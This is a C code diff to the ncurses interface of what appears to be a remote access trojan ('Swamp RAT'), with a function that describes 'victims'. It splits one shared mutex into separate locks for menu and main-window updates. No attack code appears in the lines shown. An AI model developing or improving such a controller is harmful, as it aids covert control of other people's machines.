@@ -42,8 +42,6 @@
 int y_margin = 4;
 int x_margin = 8;
 
-pthread_mutex_t NCURSES_PTHREAD_MUTEX = PTHREAD_MUTEX_INITIALIZER;
-
 #ifndef NCURSES_WMENU
 #define NCURSES_WMENU_COLOR 2
 #define NCURSES_WMENU
@@ -153,6 +151,8 @@ char *ncurses_victim_description(sys_info_t *sysinfo){
   return result;
 }
 
+pthread_mutex_t NCURSES_PTHREAD_MUTEX_WMENU_UPDATE = PTHREAD_MUTEX_INITIALIZER;
+
 MENU *ncurses_wmenu_update(WINDOW *win_main,
                           WINDOW *win_menu,
                           ITEM **items,
@@ -161,7 +161,7 @@ MENU *ncurses_wmenu_update(WINDOW *win_main,
     :TODO: update menu window
     :returns: (MENU *)
   */
-  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX);
+  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX_WMENU_UPDATE);
   MENU *menu;
   int y, x;
   getmaxyx(win_main, y, x);
@@ -192,7 +192,7 @@ MENU *ncurses_wmenu_update(WINDOW *win_main,
                   1);
   set_menu_mark(menu, " -> ");
   post_menu(menu);
-  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX);
+  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX_WMENU_UPDATE);
   return menu;
 }
 
@@ -228,13 +228,15 @@ WINDOW *ncurses_wmain_create(int port,
   return win_main;
 }
 
+pthread_mutex_t NCURSES_PTHREAD_MUTEX_WMAIN_UPDATE = PTHREAD_MUTEX_INITIALIZER;
+
 bool ncurses_wmain_update(WINDOW *win_main){
   /*
     :TODO: update main window
     :win_main: main window pointer
     :returns: boolean
   */
-  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX);
+  pthread_mutex_lock(&NCURSES_PTHREAD_MUTEX_WMAIN_UPDATE);
   int y, x;
   char win_main_title[] = "|Swamp RAT|";
   char win_main_footer[] = "|lillypad|";
@@ -269,7 +271,7 @@ bool ncurses_wmain_update(WINDOW *win_main){
             y - 2,
             (x - strlen(win_main_quote) - 1),
             win_main_quote);
-  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX);
+  pthread_mutex_unlock(&NCURSES_PTHREAD_MUTEX_WMAIN_UPDATE);
   return true;
 }
 
